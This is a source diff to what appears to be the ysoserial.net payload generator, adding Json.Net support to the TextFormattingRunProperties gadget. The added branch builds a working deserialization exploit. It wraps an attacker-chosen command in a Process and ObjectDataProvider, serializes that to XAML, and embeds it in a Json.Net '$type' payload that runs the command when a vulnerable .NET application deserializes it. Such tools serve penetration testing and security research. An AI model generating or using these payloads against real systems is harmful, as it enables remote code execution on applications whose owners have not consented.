@@ -4,6 +4,10 @@ using System.Collections.Generic;
 using Microsoft.VisualStudio.Text.Formatting;
 using ysoserial.Helpers;
 using NDesk.Options;
+using System.Collections.Specialized;
+using System.Diagnostics;
+using System.Reflection;
+using System.Windows.Data;
 
 namespace ysoserial.Generators
 {
@@ -51,7 +55,7 @@ namespace ysoserial.Generators
 
         public override string Contributors()
         {
-            return "Oleksandr Mirosh, Soroush Dalili";
+            return "Oleksandr Mirosh, Soroush Dalili, Piotr Bazydlo";
         }
 
         public override List<string> Labels()
@@ -61,7 +65,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer" };
+            return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer", "Json.Net" };
         }
 
         public override OptionSet Options()
@@ -213,6 +217,47 @@ namespace ysoserial.Generators
                         {
                             SerializersHelper.DataContractSerializer_deserialize(payload, typeof(TextFormattingRunProperties));
                         }
+                    }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
+                }
+
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("Json.Net", StringComparison.OrdinalIgnoreCase))
+            {
+                //Xaml Generation borrowed from ObjectDataProviderGenerator
+                ProcessStartInfo psi = new ProcessStartInfo();
+
+                psi.FileName = inputArgs.CmdFileName;
+                if (inputArgs.HasArguments)
+                {
+                    psi.Arguments = inputArgs.CmdArguments;
+                }
+
+                StringDictionary dict = new StringDictionary();
+                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
+                Process p = new Process();
+                p.StartInfo = psi;
+                ObjectDataProvider odp = new ObjectDataProvider();
+                odp.MethodName = "Start";
+                odp.IsInitialLoadEnabled = false;
+                odp.ObjectInstance = p;
+
+                String xamlPayload = SerializersHelper.Xaml_serialize(odp);
+
+                String payload = @"{
+    '$type':'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'ForegroundBrush':'" + xamlPayload + @"'
+}";
+
+                if (inputArgs.Test)
+                {
+                    try
+                    {
+                        SerializersHelper.JsonNet_deserialize(payload);
                     }
                     catch (Exception err)
                     {
